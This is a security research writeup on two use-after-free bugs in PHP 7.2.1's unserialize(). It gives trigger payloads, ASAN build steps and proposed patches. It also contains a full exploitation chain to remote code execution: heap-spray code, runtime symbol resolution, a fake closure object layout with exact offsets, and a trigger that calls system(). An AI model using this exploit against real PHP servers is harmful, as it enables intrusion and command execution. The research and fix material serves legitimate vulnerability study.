# PHP 7.2.1 `unserialize()` Heap-Use-After-Free — Writeup

**Affected:** PHP 7.2.1. Pattern present since PHP 5.1 (~21 years).
**Status:** No CVE — PHP policy since 2017 does not assign CVEs for `unserialize()` memory-corruption bugs.
**Original reports:** [Calif.io MAD Bugs](https://blog.calif.io/p/mad-bugs-finding-and-exploiting-a) (2026-05-01), dinosn var_destroy reentrancy (2026-05-02).

---

## 1. Overview

PHP's `unserialize()` uses a `var_hash` structure to track back-references (`R:N`) and manage deferred destructors. Two independent root causes allow user `__destruct()` to fire during `var_destroy()` without `BG(serialize_lock)` held. At that point, Phase 1 has already `efree`'d the `var_entries` chunks that store back-reference pointers. An inner `unserialize('R:N;')` from the destructor reuses the outer `var_hash` and calls `var_access(N)`, which walks the freed linked list — heap-use-after-free.

| | Calif UAF | var_destroy UAF |
|---|---|---|
| **Root cause** | `zend_user_unserialize()` missing lock | `var_destroy()` Phase 2 runs without lock |
| **Entry point** | `Serializable::unserialize()` via `C:` format | Duplicate array key |
| **Independence** | Survives var_destroy fix | Survives Calif fix |

---

## 2. Background: Unserializer Internals

### 2.1 `var_hash` Structure

```c
// ext/standard/var_unserializer.re (PHP 7.2.1)
struct php_unserialize_data {
    void *first;       // head of var_entries linked list (R: back-refs)
    void *last;        // tail
    void *first_dtor;  // head of var_dtor_entries (deferred dtors)
    void *last_dtor;   // tail
    HashTable *allowed_classes;
};
```

`var_entries` stores `zval*` pointers for `R:N` back-references. When `VAR_ENTRIES_MAX` (1024) slots are filled, a new chunk is `emalloc`'d and linked via `next`:

```c
typedef struct {
    zval *data[VAR_ENTRIES_MAX];  // 8192 bytes (64-bit)
    zend_long used_slots;          // 8 bytes
    void *next;                    // 8 bytes
} var_entries;  // total: 8208 bytes
```

### 2.2 `var_destroy` Two-Phase Destruction

```c
PHPAPI void var_destroy(php_unserialize_data_t *var_hashx) {
    var_entries *var_hash = (*var_hashx)->first;
    var_dtor_entries *var_dtor_hash = (*var_hashx)->first_dtor;

    // Phase 1: efree ALL back-ref chunks (no zval_ptr_dtor)
    while (var_hash) {
        next = var_hash->next;
        efree_size(var_hash, sizeof(var_entries));
        var_hash = next;
    }

    // Phase 2: process dtor entries (triggers __destruct)
    while (var_dtor_hash) {
        for (i = 0; i < var_dtor_hash->used_slots; i++) {
            // __wakeup handling (with lock) ...
            i_zval_ptr_dtor(zv);  // __destruct fires here (NO lock)
        }
        next = var_dtor_hash->next;
        efree_size(var_dtor_hash, sizeof(var_dtor_entries));
        var_dtor_hash = next;
    }
}
```

After Phase 1, `(*var_hashx)->first` is a dangling pointer.

### 2.3 `php_var_unserialize_init` — var_hash Reuse

```c
PHPAPI php_unserialize_data_t php_var_unserialize_init() {
    if (BG(serialize_lock) || !BG(unserialize).level) {
        d = ecalloc(1, sizeof(struct php_unserialize_data));
        if (!BG(serialize_lock)) {
            BG(unserialize).data = d;
            BG(unserialize).level = 1;
        }
    } else {
        d = BG(unserialize).data;  // REUSE outer var_hash
        ++BG(unserialize).level;
    }
    return d;
}
```

When `serialize_lock == 0 && level > 0`, the new call **reuses** the existing `var_hash` — whose `first` pointer is dangling.

### 2.4 `var_access` — The UAF Read

```c
static zval *var_access(php_unserialize_data_t *var_hashx, zend_long id) {
    var_entries *var_hash = (*var_hashx)->first;  // dangling pointer
    while (id >= VAR_ENTRIES_MAX && var_hash && var_hash->used_slots == VAR_ENTRIES_MAX) {
        var_hash = var_hash->next;  // walks freed chunks
        id -= VAR_ENTRIES_MAX;
    }
    if (!var_hash) return NULL;
    if (id < 0 || id >= var_hash->used_slots) return NULL;
    return var_hash->data[id];  // reads pointer from freed memory
}
```

---

## 3. Root Cause 1: var_destroy UAF (dinosn)

`var_destroy()` holds `BG(serialize_lock)` only around the explicit `__wakeup` dispatch. The `i_zval_ptr_dtor(zv)` at the main dtor slot (L234) runs **without the lock**. If this triggers `__destruct`, the destructor can call `unserialize()` which sees `lock == 0 && level > 0` and reuses the outer `var_hash`.

Trigger — duplicate array key pushes object onto dtor chain:

```php
class A {
    public function __destruct() {
        $r = @unserialize('R:1500;');
    }
}
$N = 2000;
$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) $payload .= "i:$i;i:$i;";
$payload .= 'i:99999;O:1:"A":0:{}';
$payload .= 'i:99999;i:42;';
$payload .= '}';
@unserialize($payload);
```

Flow: Phase 1 frees `var_entries` chunks → Phase 2 `i_zval_ptr_dtor` triggers `__destruct` (no lock) → `unserialize('R:1500;')` reuses outer `var_hash` → `var_access(1500)` reads freed memory.

---

## 4. Root Cause 2: Calif UAF (Missing serialize_lock)

`zend_user_unserialize()` dispatches `Serializable::unserialize()` **without** `BG(serialize_lock)++`:

```c
// Zend/zend_interfaces.c
ZEND_API int zend_user_unserialize(zval *object, zend_class_entry *ce,
    const unsigned char *buf, size_t buf_len, zend_unserialize_data *data) {
    // ...
    zend_call_method_with_1_params(   // NO serialize_lock++ !
        object, ce, &ce->unserialize_func, "unserialize", NULL, &zdata);
    // ...
}
```

Trigger — `Serializable` re-entrant call:

```php
class Evil implements Serializable {
    public function serialize() { return ""; }
    public function unserialize($data) {
        @unserialize('a:2:{i:0;O:7:"Trigger":0:{}i:0;i:42;}');
    }
}
$N = 2000;
$payload = 'a:' . ($N + 1) . ':{' . $entries . 'i:' . $N . ';C:4:"Evil":1:{x}}';
```

Flow: `zend_user_unserialize` (no lock) → `Evil::unserialize()` calls `unserialize()` → reuses outer `var_hash` → Trigger pushed to shared dtor chain → outer `var_destroy` Phase 1 frees chunks → Phase 2 `__destruct` → UAF.

---

## 5. Exploitation: From UAF to RCE

### 5.1 Strategy

Reclaim freed `var_entries` chunks via heap spray with a fake `zend_closure` address. `var_access(N)` returns our controlled pointer. The fake closure's `orig_internal_handler` points to `zif_system`.

### 5.2 Heap Spray

During `__destruct`, allocate strings matching `var_entries` size (8208 bytes):

```php
for ($delta = -64; $delta <= 64; $delta += 8) {
    $len = 8183 + $delta;
    $body = str_repeat(pack('Q', $fake_zval_addr), intdiv($len, 8));
    for ($k = 0; $k < 32; $k++) $spray[] = '' . $body;
}
```

### 5.3 Dynamic Symbol Resolution

Parse `/proc/self/exe` ELF `.symtab`/`.dynsym` sections and `/proc/self/maps` to resolve at runtime:
- `zend_ce_closure` — class entry for closures
- `closure_handlers` — object handlers
- `zif_system` — `system()` internal function
- `zend_closure_internal_handler` — internal closure dispatcher

### 5.4 Fake Closure Layout (PHP 7.2.1)

```
fake_zval (16 bytes):
  +0:  fake_obj_addr   (8 bytes)
  +8:  0x00000408      (4 bytes — IS_OBJECT | IS_TYPE_REFCOUNTED << 8)

fake_obj (512 bytes):
  +0:  gc.refcount = 0x7FFF0000
  +4:  gc.type_info = 0x00000018
  +16: ce = zend_ce_closure pointer value (read from memory)
  +24: handlers = closure_handlers
  +56: func.type = ZEND_INTERNAL_FUNCTION (0x01)
  +60: func.fn_flags = ZEND_ACC_PUBLIC
  +80: func.prototype = fake_obj_addr (zend_closure_internal_handler reads this)
  +88: func.num_args = 0
  +92: func.required_num_args = 0
  +104: func.handler = zend_closure_internal_handler
  +304: orig_internal_handler = zif_system
```

Key PHP 7.2.1 specifics:
- `func.handler` at obj+104 (vs 8.5.5's +144) — 7.2.1 has a smaller `zend_function.common` header (48 bytes vs 88)
- `orig_internal_handler` at obj+304 (vs 8.5.5's +336) — follows smaller `sizeof(zend_function)` (~232 vs ~256)
- `func.prototype` at obj+80 must be set to `fake_obj_addr` — `zend_closure_internal_handler` reads `EX(func)->common.prototype` to locate the closure struct
- `IS_OBJECT_EX` type_info is `0x408` (vs 8.5.5's `0x8`) — different zval type encoding

### 5.5 Trigger

```php
$result = @unserialize('R:1500;');
$result('id 1>&2');  // → system("id 1>&2") → uid=0(root)
```

---

## 6. ASAN Detection

Both PoCs produce clean `heap-use-after-free` with ASAN. **Critical build note:** PHP 7.2.1's build system ignores `make CFLAGS='-fsanitize=address'` — only 1 `__asan_` symbol ends up linked. The flags must be passed during `./configure` with `libasan5` installed and `LIBS=-ldl`:

```dockerfile
RUN apt-get install -y libasan5 ...
RUN CFLAGS='-fsanitize=address -fno-omit-frame-pointer -g -O0' \
    LDFLAGS='-fsanitize=address' LIBS='-ldl' \
    ./configure --disable-all --enable-cli --enable-debug \
    --without-pear --disable-cgi --disable-phpdbg \
    && make -j$(nproc)
```

This produces a binary with 39 `__asan_` symbols (vs 1 with the broken build).

Expected output:
```
==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x...
    #0 ... in php_var_unserialize ext/standard/var_unserializer.re:608
    #10 ... in var_destroy ext/standard/var_unserializer.re:234

freed by thread T0 here:
    #0 ... in __interceptor_free
    #2 ... in var_destroy ext/standard/var_unserializer.re:202

previously allocated by thread T0 here:
    #2 ... in var_push ext/standard/var_unserializer.re:96
```

---

## 7. Proposed Fixes

### Calif fix (narrow) — lock in `zend_user_unserialize`

```diff
  ZVAL_STRINGL(&zdata, (char*)buf, buf_len);
+ BG(serialize_lock)++;
  zend_call_method_with_1_params(..., "unserialize", NULL, &zdata);
+ BG(serialize_lock)--;
```

### var_destroy fix (complete) — lock over entire dtor walk

```diff
  PHPAPI void var_destroy(php_unserialize_data_t *var_hashx) {
+     BG(serialize_lock)++;
      // Phase 1 + Phase 2
+     BG(serialize_lock)--;
  }
```

---

## 8. Reproduction

```bash
cd 7.2.1
./build.sh

# PoC (ASAN)
./var_destroy_uaf/run_poc.sh   # → heap-use-after-free
./calif_uaf/run_poc.sh          # → heap-use-after-free

# Exploit (non-ASAN)
./var_destroy_uaf/run_exp.sh   # → uid=0(root)
./calif_uaf/run_exp.sh          # → uid=0(root)
```
